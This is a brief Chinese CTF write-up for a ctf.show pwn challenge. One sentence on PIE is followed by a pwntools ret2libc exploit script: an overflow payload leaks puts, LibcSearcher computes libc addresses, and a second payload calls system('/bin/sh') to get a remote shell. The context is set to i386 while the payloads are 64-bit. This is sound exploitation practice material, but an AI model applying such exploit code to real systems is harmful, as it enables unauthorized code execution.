# 思路
pie的作用同样是随机化地址，没有pie只能说明你能更好的利用ROPchain了  

```
from pwn import *
from LibcSearcher import *
#context(arch = "amd64",os = 'linux',log_level = 'debug')
context(arch = "i386",os = 'linux',log_level = 'debug')
#io = process("./pwn")
io = remote('pwn.challenge.ctf.show', 28140)
elf = ELF('D:\edge 下载\pwn')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

main = elf.sym['main']

pop_rdi = 0x400803 

ret = 0x4004fe  

payload = b'a' * (0x80 + 0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)

io.recvuntil("See you again!")

io.sendline(payload)

puts = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))

libcdb = LibcSearcher('puts', puts)
libc_base = puts - libcdb.dump('puts')
system = libc_base + libcdb.dump('system')
binsh = libc_base + libcdb.dump('str_bin_sh')
payload = b'a' * (0x80 + 0x8) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
io.sendline(payload)
io.interactive()


```
